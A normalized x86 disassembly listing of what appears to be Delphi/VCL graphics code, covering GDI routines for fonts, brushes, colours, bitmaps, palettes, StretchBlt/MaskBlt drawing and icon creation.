je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_422a10
mov edx esp
mov eax ebx
call sub_422914
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_422938
sub_422ac4
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_422b60
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
test bl 0x8
je r-xdata
mov eax esi
call sub_422b8c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_422bbc
sub_422b60
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_421a20
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_422b8c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421f20
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_422bbc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_42222c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_42222c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_42230c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4221f0
call sub_42154c
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4221f0
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_422cec
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_422d36
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d3d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_422d40
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_422ddc
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_422cec
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041b0
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422de3
lea eax [ ebp - 0x104 ]
call sub_403f40
retn
sub_422df8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_422f46
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_422eb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_422d40
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_422d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f4d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_422f58
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_422f8c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42320c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_422de8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423213
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push r--data
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_422de8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42305f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406ccc
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423213
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_423220
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_423258
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b80
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_4232d0
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_423328
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028d8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423425
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42342c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_423440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4234c6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4234d8
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028d8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_4232d0
mov eax esp
call sub_423440
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_42357c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_4232d0
mov [ esp ] eax
sub_4235d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_422f78
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_422f58
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42377c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_422de8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4236a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_422df8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236a9
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_422cec
sub_4236a9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_422f78
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_422de8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42375c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_422df8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423763
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_423798
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_423828
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e4c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_423b1f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_423911
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_422cec
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423918
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_423918
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_42378c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e4c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_423aff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4235d0
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e4c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_423adc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ae3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026fc
retn
call sub_422d40
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_42378c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_423798
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_423b48
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_422cc8
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b80
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
